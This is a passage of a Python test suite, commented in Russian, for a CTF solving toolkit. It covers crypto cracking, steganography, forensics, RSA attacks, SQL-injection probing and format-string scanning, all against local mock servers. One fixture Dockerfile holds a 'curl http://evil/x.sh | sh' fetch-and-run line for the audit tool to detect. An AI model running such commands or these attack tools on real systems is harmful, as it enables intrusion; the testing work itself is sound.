    ct = AES.new(key, AES.MODE_ECB).encrypt(_pad(b"hello CTF{ecb} world", 16))
    ecbp = os.path.join(tmp, "ecb.hex")
    open(ecbp, "w").write(ct.hex())
    r = run("crypto/aes_ecb.py", ecbp, "--hex", "--key", key.decode(), "--decrypt")
    check("crypto/aes_ecb.py", "CTF{ecb}" in r.stdout, r.stdout + r.stderr)

    # 46. hashcat dry-run
    r = run("crypto/hashcat_run.py", "5f4dcc3b5aa765d61d8327deb882cf99", "--dry-run")
    check("crypto/hashcat_run.py", "-m 0" in r.stdout, r.stdout + r.stderr)

    # 47. toolbox: index, auto, dispatch
    r = run("toolbox.py", "auto", "Q1RGe2ZsYWd9")
    ok_auto = "CTF{flag}" in r.stdout
    r2 = run("toolbox.py", "enc", "Q1RGe2ZsYWd9")
    r3 = run("toolbox.py", "index")
    check("toolbox.py", ok_auto and "CTF{flag}" in r2.stdout and "checksec" in r3.stdout,
          r.stdout + r2.stdout[:200] + r3.stdout[:200])

    # 48. triage --json
    jp = os.path.join(tmp, "j.txt")
    open(jp, "w").write("hello CTF{json}")
    r = run("triage.py", jp, "--json")
    check("triage.py --json", '"CTF{json}"' in r.stdout and '"path"' in r.stdout,
          r.stdout + r.stderr)

    # 48b. вывод в pipe при cp1251-консоли: «—», «→» не должны ронять скрипт
    r = run("toolbox.py", "index", env={"PYTHONIOENCODING": "cp1251"})
    r2 = run("triage.py", jp, env={"PYTHONIOENCODING": "cp1251"})
    r3 = run("misc/timeconv.py", "--help", env={"PYTHONIOENCODING": "cp1251"})
    check("unicode pipe (cp1251)",
          r.returncode == 0 and r2.returncode == 0 and r3.returncode == 0
          and "checksec" in r.stdout and "CTF{json}" in r2.stdout
          and "Traceback" not in r.stderr + r2.stderr + r3.stderr,
          r.stderr[-400:] + r2.stderr[-400:] + r3.stderr[-400:])

    # 49. artifact_hunt --json
    r = run("forensic/artifact_hunt.py", d, "--json")
    check("forensic/artifact_hunt.py --json", '"APP_SECRET"' in r.stdout or "CTF{from_log}" in r.stdout,
          r.stdout[:400] + r.stderr)

    # 50. autocrack: caesar
    ac_plain = ("the quick brown fox jumps over the lazy dog and finds "
                "CTF{autocrack} here")
    ac_cipher = "".join(
        chr((ord(c) - 97 + 7) % 26 + 97) if "a" <= c <= "z" else
        chr((ord(c) - 65 + 7) % 26 + 65) if "A" <= c <= "Z" else c
        for c in ac_plain)
    r = run("crypto/autocrack.py", "--text", ac_cipher)
    check("crypto/autocrack.py caesar", "CTF{autocrack}" in r.stdout, r.stdout[:500] + r.stderr)

    # 51. autocrack: xor
    xc = bytes(c ^ 0x42 for c in ac_plain.encode())
    r = run("crypto/autocrack.py", "--hex", xc.hex())
    check("crypto/autocrack.py xor", "CTF{autocrack}" in r.stdout, r.stdout[:500] + r.stderr)

    # 52. autocrack: base64 x2
    b64x = base64.b64encode(base64.b64encode(ac_plain.encode())).decode()
    r = run("crypto/autocrack.py", "--text", b64x)
    check("crypto/autocrack.py base64", "CTF{autocrack}" in r.stdout, r.stdout[:500] + r.stderr)

    # 53. autocrack: hash
    r = run("crypto/autocrack.py", "--hash", hashlib.md5(b"password").hexdigest())
    check("crypto/autocrack.py hash", "'password'" in r.stdout or "password" in r.stdout,
          r.stdout[-400:] + r.stderr)

    # 54. autocrack: vigenere --deep
    vkey = "LEMON"
    vc = ""
    jj = 0
    for ch in (ac_plain * 3):
        if ch.isalpha():
            vc += chr((ord(ch.lower()) - 97 + ord(vkey[jj % len(vkey)]) - 65) % 26 + 97)
            jj += 1
        else:
            vc += ch
    r = run("crypto/autocrack.py", "--text", vc, "--deep")
    check("crypto/autocrack.py vigenere", "vigenere(LEMON)" in r.stdout or "autocrack" in r.stdout,
          r.stdout[:600] + r.stderr)

    # 55. flags: default / prefix / any / env / set
    fp = os.path.join(tmp, "flags.txt")
    open(fp, "w", encoding="utf-8").write("ACME{test_flag} and CTF{normal_flag}")

    def flag_lines(out):
        return " ".join(l for l in out.splitlines() if "ФЛАГИ:" in l)

    r = run("triage.py", fp)
    fl = flag_lines(r.stdout)
    check("flags default", "CTF{normal_flag}" in fl and "ACME{test_flag}" not in fl,
          r.stdout + r.stderr)

    r = run("triage.py", fp, "--flag-prefix", "ACME")
    fl = flag_lines(r.stdout)
    check("flags --flag-prefix", "ACME{test_flag}" in fl and "CTF{normal_flag}" not in fl,
          r.stdout + r.stderr)

    r = run("triage.py", fp, "--any-prefix")
    fl = flag_lines(r.stdout)
    check("flags --any-prefix", "ACME{test_flag}" in fl and "CTF{normal_flag}" in fl,
          r.stdout + r.stderr)

    r = run("triage.py", fp, env={"FLAG_PREFIXES": "ACME"})
    fl = flag_lines(r.stdout)
    check("flags env", "ACME{test_flag}" in fl, r.stdout + r.stderr)

    # локальные префиксы + регистронезависимость (NTO/InnoCTF/VOSH/Innopolis)
    lp = os.path.join(tmp, "local_flags.txt")
    open(lp, "w", encoding="utf-8").write(
        "NTO{one} nto{two} InnoCTF{three} INNOCTF{four} VoSh{five} Innopolis{six}")
    r = run("triage.py", lp)
    fl = flag_lines(r.stdout)
    check("flags local prefixes",
          all(x in fl for x in ("NTO{one}", "InnoCTF{three}", "VoSh{five}",
                                "Innopolis{six}")), r.stdout + r.stderr)

    hp = os.path.join(tmp, "htb.txt")
    open(hp, "w", encoding="utf-8").write("HTB{set_test_flag}")
    r = run("triage.py", hp, "--flag-set", "extended")
    fl = flag_lines(r.stdout)
    check("flags --flag-set", "HTB{set_test_flag}" in fl, r.stdout + r.stderr)

    r = run("triage.py", hp, "--flag-set", "EXTENDED")
    fl = flag_lines(r.stdout)
    check("flags --flag-set case", "HTB{set_test_flag}" in fl, r.stdout + r.stderr)

    r = run("toolbox.py", "auto", "NTO{string_is_flag}")
    check("toolbox.py auto string flag", "NTO{string_is_flag}" in r.stdout,
          r.stdout + r.stderr)

    r = run("forensic/artifact_hunt.py", fp, "--flag-prefix", "ACME")
    check("flags hunt", "ACME{test_flag}" in r.stdout, r.stdout + r.stderr)

    # 61. megacrack: AES с ключом из материала
    from Crypto.Cipher import AES as _AES
    from Crypto.Util.Padding import pad as _pad2
    mg_flag = "CTF{mega_ok}"
    mg_key = hashlib.sha256(b"seed").digest()
    mg_ct = _AES.new(mg_key, _AES.MODE_CBC, b"\x00" * 16).encrypt(_pad2(mg_flag.encode(), 16))
    mg_c = os.path.join(tmp, "mega.bin")
    open(mg_c, "wb").write(mg_ct)
    mg_m = os.path.join(tmp, "mega_note.txt")
    open(mg_m, "w").write("seed\n")
    r = run("crypto/megacrack.py", "--cipher-file", mg_c, "--material", mg_m)
    check("crypto/megacrack.py aes", mg_flag in r.stdout, r.stdout[-500:] + r.stderr)

    # 62. megacrack: XOR с ключом-строкой
    mg_flag2 = "CTF{mega_xor}"
    mg_key2 = b"secretkey"
    mg_ct2 = bytes(c ^ mg_key2[i % len(mg_key2)] for i, c in enumerate(mg_flag2.encode()))
    mg_c2 = os.path.join(tmp, "mega2.bin")
    open(mg_c2, "wb").write(mg_ct2)
    r = run("crypto/megacrack.py", "--cipher-file", mg_c2, "--material", "secretkey")
    check("crypto/megacrack.py xor", mg_flag2 in r.stdout, r.stdout[-500:] + r.stderr)

    # 63. megaall: AES + материал
    ma_flag = "CTF{megaall_ok}"
    ma_key = hashlib.sha256(b"seed").digest()
    ma_ct = _AES.new(ma_key, _AES.MODE_CBC, b"\x00" * 16).encrypt(_pad2(ma_flag.encode(), 16))
    ma_c = os.path.join(tmp, "ma.bin")
    open(ma_c, "wb").write(ma_ct)
    ma_m = os.path.join(tmp, "ma_note.txt")
    open(ma_m, "w").write("seed\n")
    r = run("megaall.py", "--file", ma_c, "--file", ma_m)
    check("megaall.py aes", ma_flag in r.stdout, r.stdout[-500:] + r.stderr)

    # 64. megaall: только текст с флагом
    r = run("megaall.py", "--text", "prefix CTF{plain_mega} suffix")
    check("megaall.py text", "CTF{plain_mega}" in r.stdout, r.stdout[-500:] + r.stderr)

    # 65. megaall: хеш
    mh = os.path.join(tmp, "mh.txt")
    open(mh, "w").write(hashlib.md5(b"password").hexdigest())
    r = run("megaall.py", "--file", mh)
    check("megaall.py hash", "password" in r.stdout, r.stdout[-500:] + r.stderr)

    # 66. whitespace: интерпретатор
    def ws_push(n):
        sign = " " if n >= 0 else "\t"
        bits = bin(abs(n))[2:]
        return "  " + sign + "".join("\t" if b == "1" else " " for b in bits) + "\n"

    def ws_out():
        return "\t\t  "

    ws_flag = "CTF{ws}"
    wsp = os.path.join(tmp, "w.ws")
    open(wsp, "w", encoding="utf-8").write(
        "".join(ws_push(ord(c)) + ws_out() for c in ws_flag))
    r = run("stego/whitespace.py", wsp, "--mode", "ws")
    check("stego/whitespace.py ws", ws_flag in r.stdout, r.stdout + r.stderr)

    # 67. zero-width
    zbits = "".join(f"{ord(c):08b}" for c in ws_flag)
    zwtext = "".join("\u200b" if b == "0" else "\u200c" for b in zbits)
    zwp = os.path.join(tmp, "zw.txt")
    open(zwp, "w", encoding="utf-8").write(zwtext)
    r = run("stego/whitespace.py", zwp, "--mode", "zw")
    check("stego/whitespace.py zw", ws_flag in r.stdout, r.stdout + r.stderr)

    # 68. brainfuck
    bfcode = "".join("[-]" + "+" * ord(c) + "." for c in ws_flag)
    bfp = os.path.join(tmp, "w.bf")
    open(bfp, "w").write(bfcode)
    r = run("stego/esolang.py", bfp, "--lang", "bf")
    check("stego/esolang.py bf", ws_flag in r.stdout, r.stdout + r.stderr)

    # 69. bacon
    bl = "".join(c for c in ws_flag.upper() if c.isalpha())
    bits = "".join(f"{ord(c) - 65:05b}" for c in bl)
    bacon = " ".join("B" if b == "1" else "A" for b in bits)
    r = run("crypto/obscure.py", "bacon", "--text", bacon)
    check("crypto/obscure.py bacon", bl in r.stdout, r.stdout + r.stderr)

    # 70. base58
    B58 = "123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz"

    def b58enc(data):
        n = int.from_bytes(data, "big")
        s = ""
        while n:
            n, rem = divmod(n, 58)
            s = B58[rem] + s
        return "1" * (len(data) - len(data.lstrip(b"\x00"))) + s

    r = run("crypto/obscure.py", "base58", "--text", b58enc(ws_flag.encode()))
    check("crypto/obscure.py base58", ws_flag in r.stdout, r.stdout + r.stderr)

    # 71. документ DOCX, внутри Whitespace
    doc_flag = "CTF{doc}"
    prog = "".join(ws_push(ord(c)) + ws_out() for c in doc_flag)
    docx = os.path.join(tmp, "d.docx")
    with zipfile.ZipFile(docx, "w") as z:
        z.writestr("[Content_Types].xml", "<Types/>")
        z.writestr("word/document.xml",
                   '<w:document><w:t xml:space="preserve">' + prog + "</w:t></w:document>")
    r = run("triage.py", docx)
    check("triage.py docx whitespace", "whitespace-only" in r.stdout, r.stdout + r.stderr)

    extracted = os.path.join(tmp, "doc.txt")
    r = run("doctext.py", docx, "--out", extracted)
    check("doctext.py docx", os.path.exists(extracted), r.stdout + r.stderr)
    r = run("stego/whitespace.py", extracted, "--mode", "ws")
    check("docx -> ws", doc_flag in r.stdout, r.stdout + r.stderr)

    # 72. zero-width в обычном тексте
    zw2 = os.path.join(tmp, "zw2.txt")
    open(zw2, "w", encoding="utf-8").write(
        "".join("\u200b" if b == "0" else "\u200c"
                for b in "".join(f"{ord(c):08b}" for c in doc_flag)))
    r = run("triage.py", zw2)
    check("triage.py zero-width", "zero-width" in r.stdout, r.stdout + r.stderr)

    # 73. auto на документе советует ws
    r = run("toolbox.py", "auto", docx)
    check("toolbox.py auto docx", "whitespace-only" in r.stdout and "ws" in r.stdout,
          r.stdout + r.stderr)

    # 73b. auto: ZIP спрятан в середине файла (обрезанный том) — сразу флаг
    frag = os.path.join(tmp, "volume.bin")
    zbuf = io.BytesIO()
    with zipfile.ZipFile(zbuf, "w") as z:
        z.writestr("dispatch.txt", "CTF{inside_volume}\n")
    with open(frag, "wb") as f:
        f.write(b"STORAGE " + b"\x00" * 300 + zbuf.getvalue())
    r = run("toolbox.py", "auto", frag)
    check("toolbox.py auto embedded-zip",
          "CTF{inside_volume}" in r.stdout and "смещению" in r.stdout,
          r.stdout + r.stderr)

    # 73c. auto: JSON-отказ API вместо файла
    denial_json = os.path.join(tmp, "denied_api.json")
    open(denial_json, "w", encoding="utf-8").write(
        '{"code":"ACCESS_DENIED","error":"open task page"}')
    r = run("toolbox.py", "auto", denial_json)
    check("toolbox.py auto api-denial", "ответ API" in r.stdout, r.stdout + r.stderr)

    # 74. megarev: PE
    r = run("reverse/megarev.py", "--file", PY)
    check("reverse/megarev.py PE", "PE" in r.stdout, r.stdout[-500:] + r.stderr)

    # 75. megarev: pyc + XOR-флаг
    import py_compile
    src = os.path.join(tmp, "rev.py")
    open(src, "w").write("KEY = 'secretkey'\n\ndef check(x):\n    return x == 'nope'\n")
    pyc = os.path.join(tmp, "rev.pyc")
    py_compile.compile(src, cfile=pyc, doraise=True)
    rev_flag = b"CTF{rev_mega}"
    rev_key = b"secretkey"
    with open(pyc, "ab") as f:
        f.write(bytes(c ^ rev_key[i % len(rev_key)] for i, c in enumerate(rev_flag)))
    r = run("reverse/megarev.py", "--file", pyc)
    check("reverse/megarev.py pyc", rev_flag.decode() in r.stdout, r.stdout[-800:] + r.stderr)

    # 76. docker image: whiteouts + секреты
    def layer(files):
        buf = io.BytesIO()
        with tarfile.open(fileobj=buf, mode="w") as t:
            for n, d in files.items():
                ti = tarfile.TarInfo(n)
                ti.size = len(d)
                t.addfile(ti, io.BytesIO(d))
        return buf.getvalue()

    l1 = layer({"app/secret.txt": b"PASSWORD=hiddenpass\n",
                "app/deleted.txt": b"CTF{docker_layer}\n"})
    l2 = layer({"app/.wh.deleted.txt": b""})
    image = os.path.join(tmp, "image.tar")
    with tarfile.open(image, "w") as t:
        def add(name, data):
            ti = tarfile.TarInfo(name)
            ti.size = len(data)
            t.addfile(ti, io.BytesIO(data))

        add("manifest.json", json.dumps([{
            "Config": "config.json", "RepoTags": ["a:latest"],
            "Layers": ["l1/layer.tar", "l2/layer.tar"]}]).encode())
        add("config.json", json.dumps({
            "config": {"Env": ["PASSWORD=supersecret"], "Cmd": ["/app"]},
            "history": [{"created_by": "RUN export TOKEN=abcdef"}]}).encode())
        add("l1/layer.tar", l1)
        add("l2/layer.tar", l2)
    r = run("forensic/docker_image.py", image)
    check("forensic/docker_image.py",
          "CTF{docker_layer}" in r.stdout and "hiddenpass" in r.stdout
          and "deleted" in r.stdout, r.stdout[-800:] + r.stderr)

    # 77. dockerfile audit
    df = os.path.join(tmp, "Dockerfile")
    open(df, "w").write("FROM ubuntu\nENV PASSWORD=secret123\n"
                        "ADD http://evil/x.sh /x.sh\nRUN curl http://evil/x.sh | sh\n")
    r = run("forensic/docker_image.py", df, "--dockerfile")
    check("forensic/docker_image.py dockerfile",
          "latest" in r.stdout or "секрет" in r.stdout, r.stdout + r.stderr)

    # 78. git_hunt
    repo = os.path.join(tmp, "repo")
    os.makedirs(repo)
    subprocess.run(["git", "-C", repo, "init", "-q"], check=True)
    subprocess.run(["git", "-C", repo, "config", "user.email", "a@b.c"], check=True)
    subprocess.run(["git", "-C", repo, "config", "user.name", "a"], check=True)
    gf = os.path.join(repo, "secret.txt")
    open(gf, "w").write("CTF{git_history}\n")
    subprocess.run(["git", "-C", repo, "add", "."], check=True)
    subprocess.run(["git", "-C", repo, "commit", "-qm", "one"], check=True)
    os.remove(gf)
    subprocess.run(["git", "-C", repo, "add", "-A"], check=True)
    subprocess.run(["git", "-C", repo, "commit", "-qm", "two"], check=True)
    r = run("forensic/git_hunt.py", repo)
    check("forensic/git_hunt.py", "CTF{git_history}" in r.stdout and "secret.txt" in r.stdout,
          r.stdout[-600:] + r.stderr)

    # 79. browser artifacts
    hist = os.path.join(tmp, "History")
    con = sqlite3.connect(hist)
    con.execute("create table urls(url text, title text, visit_count int, last_visit_time int)")
    con.execute("insert into urls values('http://x/CTF{browser}','t',1,0)")
    con.commit(); con.close()
    r = run("forensic/browser_artifacts.py", hist)
    check("forensic/browser_artifacts.py", "CTF{browser}" in r.stdout, r.stdout + r.stderr)

    # 80. windows triage
    winp = os.path.join(tmp, "NTUSER.DAT")
    open(winp, "wb").write("Run C:\\evil.exe".encode("utf-16le") + b"\x00CTF{win_reg}\x00")
    r = run("forensic/windows_triage.py", winp)
    check("forensic/windows_triage.py", "CTF{win_reg}" in r.stdout, r.stdout + r.stderr)

    # 81. office macros
    docm = os.path.join(tmp, "m.docx")
    with zipfile.ZipFile(docm, "w") as z:
        z.writestr("word/document.xml", "<w:document/>")
        z.writestr("word/vbaProject.bin", b"CTF{macro}")
    r = run("forensic/office_docs.py", docm)
    check("forensic/office_docs.py", "CTF{macro}" in r.stdout and "vbaProject" in r.stdout,
          r.stdout[-500:] + r.stderr)

    # 82. cloud creds
    cloudp = os.path.join(tmp, "creds.txt")
    open(cloudp, "w").write("AWS_ACCESS_KEY_ID=AKIAABCDEFGHIJKLMNOP\n"
                            "aws_secret_access_key=" + "A" * 40 + "\n")
    r = run("forensic/cloud_creds.py", cloudp)
    check("forensic/cloud_creds.py", "AKIAABCDEFGHIJKLMNOP" in r.stdout, r.stdout + r.stderr)

    # 83. DTMF
    dtmf_wav = os.path.join(tmp, "dtmf.wav")
    freqs = {"1": (697, 1209), "2": (697, 1336), "3": (697, 1477)}
    rate = 8000
    samples = []
    for d in "123":
        f1, f2 = freqs[d]
        for i in range(int(rate * 0.2)):
            samples.append(int(8000 * (math.sin(2 * math.pi * f1 * i / rate) +
                                       math.sin(2 * math.pi * f2 * i / rate))))
        samples += [0] * int(rate * 0.05)
    with wave.open(dtmf_wav, "w") as w:
        w.setnchannels(1); w.setsampwidth(2); w.setframerate(rate)
        w.writeframes(b"".join(struct.pack("<h", s) for s in samples))
    r = run("stego/audio_tools.py", dtmf_wav, "--mode", "dtmf")
    check("stego/audio_tools.py dtmf", "123" in r.stdout, r.stdout + r.stderr)

    # 83b. audio_tools: морзе из формы волны (точки/тире разной длины)
    a_rate = 22050
    dot = int(a_rate * 0.08)
    samples = []

    def _tone(n):
        samples.extend(int(6000 * math.sin(2 * math.pi * 700 * i / a_rate)) for i in range(n))

    def _sil(n):
        samples.extend([0] * n)

    pattern = {"S": "...", "O": "---"}
    for ch in "SOS":
        for sym in pattern[ch]:
            _tone(dot if sym == "." else dot * 3)
            _sil(dot)
        _sil(dot * 2)
    morse_wav = os.path.join(tmp, "morse.wav")
    with wave.open(morse_wav, "w") as w:
        w.setnchannels(1); w.setsampwidth(2); w.setframerate(a_rate)
        w.writeframes(b"".join(struct.pack("<h", s) for s in samples))
    r = run("stego/audio_tools.py", morse_wav, "--raw")
    check("stego/audio_tools.py morse", "SOS" in r.stdout, r.stdout + r.stderr)

    # 83c. audio_tools: вместо WAV прилетел JSON-отказ API — без трейсбека
    notwav = os.path.join(tmp, "denied.wav")
    open(notwav, "w", encoding="utf-8").write('{"code":"ACCESS_DENIED","error":"open task page"}')
    r = run("stego/audio_tools.py", notwav)
    check("stego/audio_tools.py not-wav",
          r.returncode == 0 and "не WAV" in r.stdout and "Traceback" not in r.stderr,
          r.stdout + r.stderr)

    # 83d. triage: JSON-отказ API распознаётся как «файл не скачался»
    r = run("triage.py", notwav)
    check("triage.py api-denial", "ответ API" in r.stdout, r.stdout[:400] + r.stderr)

    # 84. lang info (Go)
    gop = os.path.join(tmp, "go.bin")
    open(gop, "wb").write(b"junk .go.buildinfo go1.22.0 path\tmain")
    r = run("reverse/lang_info.py", gop)
    check("reverse/lang_info.py", "Go" in r.stdout, r.stdout + r.stderr)

    # 85. RSA wiener
    p, q = 1009, 1013
    n_w = p * q
    phi = (p - 1) * (q - 1)
    d_w = 5
    e_w = pow(d_w, -1, phi)
    m_w = 123
    c_w = pow(m_w, e_w, n_w)
    r = run("crypto/rsa_tool.py", "wiener", "--n", str(n_w), "--e", str(e_w),
            "--cipher", str(c_w))
    check("crypto/rsa_tool.py wiener", f"d={d_w}" in r.stdout and str(m_w) in r.stdout,
          r.stdout + r.stderr)

    # 86. RSA broadcast
    m_b = 100
    pairs = []
    for p1, q1 in ((1009, 1013), (1019, 1021), (1031, 1033)):
        n1 = p1 * q1
        pairs += ["--pairs", f"{n1}:{pow(m_b, 3, n1)}"]
    r = run("crypto/rsa_tool.py", "broadcast", "--e", "3", *pairs)
    check("crypto/rsa_tool.py broadcast", "int : 100" in r.stdout or "int: 100" in r.stdout,
          r.stdout + r.stderr)

    # 87. flag_hunt: flag.txt, flag_<random>, содержимое
    fdir = os.path.join(tmp, "flags")
    os.makedirs(fdir, exist_ok=True)
    open(os.path.join(fdir, "flag.txt"), "w").write("CTF{flag_file}")
    open(os.path.join(fdir, "flag_sdfgjdo348932idfgj"), "w").write("nothing")
    open(os.path.join(fdir, "note.txt"), "w").write("here CTF{inside_note}")
    open(os.path.join(fdir, "normal.txt"), "w").write("hello")
    r = run("forensic/flag_hunt.py", fdir)
    check("forensic/flag_hunt.py",
          "flag.txt" in r.stdout and "flag_sdfgjdo348932idfgj" in r.stdout
          and "CTF{inside_note}" in r.stdout, r.stdout + r.stderr)

    # 88. param_probe: SQLi в поиске отдаёт скрытые записи с флагом
    import http.server
    import threading
    import urllib.parse as _up

    class _SqlHandler(http.server.BaseHTTPRequestHandler):
        def do_GET(self):
            q = _up.parse_qs(_up.urlparse(self.path).query)
            val = " ".join(q.get("q", [""]))
            body = "<html>no results for " + val + "</html>"
            if "OR 1=1" in val:
                body = "<html>all records: ... CTF{sqli_bypass}</html>"
            data = body.encode()
            self.send_response(200)
            self.send_header("Content-Type", "text/html; charset=utf-8")
            self.send_header("Content-Length", str(len(data)))
            self.end_headers()
            self.wfile.write(data)

        def log_message(self, *a):
            pass

    srv = http.server.HTTPServer(("127.0.0.1", 0), _SqlHandler)
    threading.Thread(target=srv.serve_forever, daemon=True).start()
    try:
        url = f"http://127.0.0.1:{srv.server_address[1]}/?q=0"
        r = run("web/param_probe.py", url)
        check("web/param_probe.py sqli",
              "CTF{sqli_bypass}" in r.stdout, r.stdout[:800] + r.stderr)
    finally:
        srv.shutdown()

    # 89. oracle: gcd-сервис, 5 раундов -> флаг
    import socket as _sock
    import threading as _thr

    _srv = _sock.socket()
    _srv.setsockopt(_sock.SOL_SOCKET, _sock.SO_REUSEADDR, 1)
    _srv.bind(("127.0.0.1", 0))
    _srv.listen(1)
    _port = _srv.getsockname()[1]
    _pairs = [(3, 5), (4, 6), (7, 11), (9, 12), (13, 17)]

    def _oracle_server():
        c, _ = _srv.accept()
        try:
            for a, b in _pairs:
                c.sendall(f"{a} {b}\n".encode())
                ans = c.recv(64).decode().strip()
                want = "YES" if math.gcd(a, b) == 1 else "NO"
                if ans != want:
                    c.sendall(b"WRONG\n")
                    return
            c.sendall(b"CTF{oracle_ok}\n")
        finally:
            c.close()
            _srv.close()

    _thr.Thread(target=_oracle_server, daemon=True).start()
    r = run("pwn/oracle.py", "--connect", f"127.0.0.1:{_port}",
            "--match", r"(\d+) +(\d+)", "--expr", "gcd(a, b) == 1",
            "--send-expr", "'YES' if v else 'NO'", "--repeat", "10")
    check("pwn/oracle.py gcd",
          "CTF{oracle_ok}" in r.stdout and "раундов с ответом: 5" in r.stdout,
          r.stdout + r.stderr)

    # 90. megarev: короткий числовой PIN рядом со словом
    pinbin = os.path.join(tmp, "pin.bin")
    with open(pinbin, "wb") as f:
        f.write(b"\x00" * 64 + b"Enter PIN: \x00\x00" + b"482917\x00" + b"Denied\x00")
    r = run("reverse/megarev.py", pinbin)
    check("reverse/megarev.py secret-like",
          "482917" in r.stdout and "возможный" in r.stdout,
          r.stdout[-800:] + r.stderr)

    # 91. fmtstr scan: эхо-сервис, поиск индексов и %N$s
    fs_srv = os.path.join(tmp, "fs_srv.py")
    with open(fs_srv, "w", encoding="utf-8") as f:
        f.write(
            "import re, sys\n"
            "sys.stdout.write('echo> '); sys.stdout.flush()\n"
            "line = sys.stdin.readline()\n"
            "out = []\n"
            "for n, kind in re.findall(r'%(\\d+)\\$(p|s)', line):\n"
            "    if kind == 'p':\n"
            "        out.append('0x%x' % (0x4142434445464748 if n == '3'\n"
            "                              else 0x7ffd12340000 + int(n)))\n"
            "    else:\n"
            "        out.append('CTF{fmt_scan}' if n == '5' else 'x')\n"
            "sys.stdout.write('|'.join(out) + '\\n'); sys.stdout.flush()\n"
        )
    r = run("pwn/fmtstr.py", "scan", "--local", f"{sys.executable} {fs_srv}",
            "--count", "8", "--deref")
    check("pwn/fmtstr.py scan",
          "CTF{fmt_scan}" in r.stdout and "ascii='HGFEDCBA'" in r.stdout,
          r.stdout[-900:] + r.stderr)

    # 92. solve: автопилот — XOR-блоб и архив внутри файла
    sx = os.path.join(tmp, "solve_xor.bin")
    skey = b"k3y!"
    sdata = b"CTF{solve_auto} " + b"padding " * 4
    with open(sx, "wb") as f:
        f.write(bytes(c ^ skey[i % len(skey)] for i, c in enumerate(sdata)))
    r = run("solve.py", sx, "--time", "30")
    se = os.path.join(tmp, "solve_emb.bin")
    _zb = io.BytesIO()
    with zipfile.ZipFile(_zb, "w") as z:
        z.writestr("note.txt", "CTF{solve_zip}\n")
    with open(se, "wb") as f:
        f.write(b"JUNK" * 80 + _zb.getvalue())
    r2 = run("solve.py", se, "--time", "40")
    check("solve.py auto",
          "CTF{solve_auto}" in r.stdout and "CTF{solve_zip}" in r2.stdout,
          r.stdout[-500:] + r2.stdout[-700:] + r.stderr + r2.stderr)

    # 92b. solve: короткий текст должен доходить до autocrack (бюджет подшагов)
    ca = os.path.join(tmp, "solve_caesar.txt")
    ca_plain = "CTF{solve_caesar}"

    def _rot(ch, k):
        if ch.isupper():
            return chr((ord(ch) - 65 + k) % 26 + 65)
        if ch.islower():
            return chr((ord(ch) - 97 + k) % 26 + 97)
        return ch

    ca_cipher = "".join(_rot(c, 11) for c in ca_plain)
    with open(ca, "w", encoding="utf-8") as f:
        f.write(ca_cipher)
    r3 = run("solve.py", ca, "--time", "40")
    check("solve.py caesar", ca_plain in r3.stdout, r3.stdout[-600:] + r3.stderr)

    # 92c. solve: PEM-ключ + cipher.bin рядом
    from Crypto.PublicKey import RSA as _RK
    from Crypto.Util.number import getPrime as _gp
    pem_dir = os.path.join(tmp, "pem_solve")
    os.makedirs(pem_dir, exist_ok=True)
    _p = _gp(256)
    _n = _p * 10007
    _pub = _RK.construct((_n, 65537))
    with open(os.path.join(pem_dir, "public.pem"), "wb") as f:
        f.write(_pub.export_key())
    _m = int.from_bytes(b"CTF{pem_solve}", "big")
    _c = pow(_m, 65537, _n)
    with open(os.path.join(pem_dir, "cipher.bin"), "wb") as f:
        f.write(_c.to_bytes((_c.bit_length() + 7) // 8, "big"))
    r4 = run("solve.py", pem_dir, "--time", "40")
    check("solve.py pem", "CTF{pem_solve}" in r4.stdout, r4.stdout[-700:] + r4.stderr)

    # 92d. solve: utf-16 файл должен дойти до enc
    u16 = os.path.join(tmp, "solve_utf16.bin")
    with open(u16, "wb") as f:
        f.write("CTF{solve_utf16}".encode("utf-16-le"))
    r5 = run("solve.py", u16, "--time", "30")
    check("solve.py utf16", "CTF{solve_utf16}" in r5.stdout, r5.stdout[-600:] + r5.stderr)

    # 93. recon: комментарии, JWT, robots, base64 в JS
    class _ReconHandler(http.server.BaseHTTPRequestHandler):
        def do_GET(self):
            if self.path == "/robots.txt":
                body = b"User-agent: *\nDisallow: /secret\n# CTF{robots_flag}\n"
            else:
                body = (b"<html><script>var b='Q1RGe2pzX2I2NH0=';</script>"
                        b"<!-- CTF{comment_flag} -->"
                        b"<form action='/login' method='post'><input name='u'></form>"
                        b"</body></html>")
            self.send_response(200)
            self.send_header("Content-Type", "text/html; charset=utf-8")
            self.send_header("Set-Cookie",
                             "session=eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJhZG1pbiJ9.sig")
            self.send_header("Content-Length", str(len(body)))
            self.end_headers()
            self.wfile.write(body)

        def log_message(self, *a):
            pass

    _srv2 = http.server.HTTPServer(("127.0.0.1", 0), _ReconHandler)
    threading.Thread(target=_srv2.serve_forever, daemon=True).start()
    try:
        r = run("web/recon.py", f"http://127.0.0.1:{_srv2.server_address[1]}/")
        check("web/recon.py",
              "CTF{comment_flag}" in r.stdout and "'sub': 'admin'" in r.stdout
              and "CTF{robots_flag}" in r.stdout and "/login" in r.stdout
              and "CTF{js_b64}" in r.stdout, r.stdout[-900:] + r.stderr)
    finally:
        _srv2.shutdown()

    # 94. auto по папке: типы, флаги, план
    _dd = os.path.join(tmp, "autodir")
    os.makedirs(_dd, exist_ok=True)
    open(os.path.join(_dd, "a.txt"), "w", encoding="utf-8").write("hi CTF{dir_auto}")
    r = run("toolbox.py", "auto", _dd)
    check("toolbox.py auto dir",
          "CTF{dir_auto}" in r.stdout and "solve" in r.stdout, r.stdout[:800] + r.stderr)

    # 95. enc: морзе текстом и алфавит из двух символов
    r = run("enc.py", ".... . .-.. .-.. --- / .-- --- .-. .-.. -..")
    check("enc.py morse-text", "HELLO WORLD" in r.stdout, r.stdout + r.stderr)
    bits = "".join(f"{ord(c):08b}" for c in "CTF{two}")
    two = bits.replace("0", ".").replace("1", "-")
    r = run("enc.py", two)
    check("enc.py 2sym", "CTF{two}" in r.stdout, r.stdout + r.stderr)

    # 96. hint: разбор с объяснением
    r = run("toolbox.py", "hint", "Q1RGe2ZsYWd9")
    check("toolbox.py hint",
          "CTF{flag}" in r.stdout and "как это понимать" in r.stdout,
          r.stdout[-600:] + r.stderr)

    # 97. enc: «кракозябры» — это кодировка, а не шифр
    moji = "Привет, CTF{enc}".encode("utf-8").decode("latin-1")
    moji_file = os.path.join(tmp, "moji.txt")
    with open(moji_file, "w", encoding="utf-8") as f:
        f.write(moji)
    r = run("enc.py", "--file", moji_file)
    check("enc.py mojibake", "Привет" in r.stdout, r.stdout[:400] + r.stderr)

